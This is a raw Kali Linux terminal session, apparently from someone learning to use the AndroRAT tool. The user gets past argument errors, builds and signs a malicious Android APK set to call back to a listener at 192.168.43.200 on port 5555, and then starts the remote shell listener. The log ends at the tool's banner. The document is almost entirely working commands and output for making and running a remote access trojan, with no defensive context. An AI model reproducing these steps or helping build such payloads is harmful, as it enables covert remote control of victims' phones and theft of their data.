                                                     
┌──(venv)─(kali㉿kali)-[~/AndroRAT]
└─$ python3 androRAT.py --build --host <YOUR-IP> --port <PORT>
zsh: parse error near `\n'
                                                     
┌──(venv)─(kali㉿kali)-[~/AndroRAT]
└─$ python3 androRAT.py --build --host 192.168.43.200 --port 5555  
usage: androRAT.py [--build] [--shell] [-i <IP> -p <PORT> -o <apk name>]
androRAT.py: error: unrecognized arguments: --host 192.168.43.200
                                                     
┌──(venv)─(kali㉿kali)-[~/AndroRAT]
└─$ python3 androRAT.py --build -i 192.168.43.200 -p 5555 -o kali
[INFO] Generating APK
[INFO] Building APK | 
[SUCCESS] Successfully apk built in /home/kali/AndroRAT/kali
[INFO] Signing the apk
[INFO] Signing Apk | 
provided apk path or file 'kali' does not exist
Run with '--debug' parameter to get additional information.

[ERROR] Signing Failed
                                                     
┌──(venv)─(kali㉿kali)-[~/AndroRAT]
└─$ /home/kali/AndroRAT/kali
zsh: permission denied: /home/kali/AndroRAT/kali
                                                     
┌──(venv)─(kali㉿kali)-[~/AndroRAT]
└─$ python3 androRAT.py --build -i 192.168.43.200 -p 5555 -o kali.apk
[INFO] Generating APK
[INFO] Building APK | 
[SUCCESS] Successfully apk built in /home/kali/AndroRAT/kali.apk                                          
[INFO] Signing the apk
[INFO] Signing Apk | 
[SUCCESS] Successfully signed the apk kali.apk
 
                                                     
┌──(venv)─(kali㉿kali)-[~/AndroRAT]
└─$ ls
Android_Code  Jar_utils  __pycache__       utils.py
androRAT.py   kali       README.md         venv
Compiled_apk  kali.apk   requirements.txt
Dumps         LICENSE    Screenshots
                                                     
┌──(venv)─(kali㉿kali)-[~/AndroRAT]
└─$ python3 androRAT.py --server
usage: androRAT.py [--build] [--shell] [-i <IP> -p <PORT> -o <apk name>]
androRAT.py: error: unrecognized arguments: --server
                                                     
┌──(venv)─(kali㉿kali)-[~/AndroRAT]
└─$ python3 androRAT.py --shell
[ERROR] Arguments Missing
                                                     
┌──(venv)─(kali㉿kali)-[~/AndroRAT]
└─$ python3 androRAT.py --shell -i 192.168.43.200 -p 5555

                    _           _____         _______
    /\             | |         |  __ \     /\|__   __|                                                    
   /  \   _ __   __| |_ __ ___ | |__) |   /  \  | |                                                       
  / /\ \ | '_ \ / _` | '__/ _ \|  _  /   / /\ \ | |                                                       
 / ____ \| | | | (_| | | | (_) | | \ \  / ____ \| |                                                       
/_/    \_\_| |_|\__,_|_|  \___/|_|  \_\/_/    \_\_|  
                                                     
                                       - By karma9874
                                 
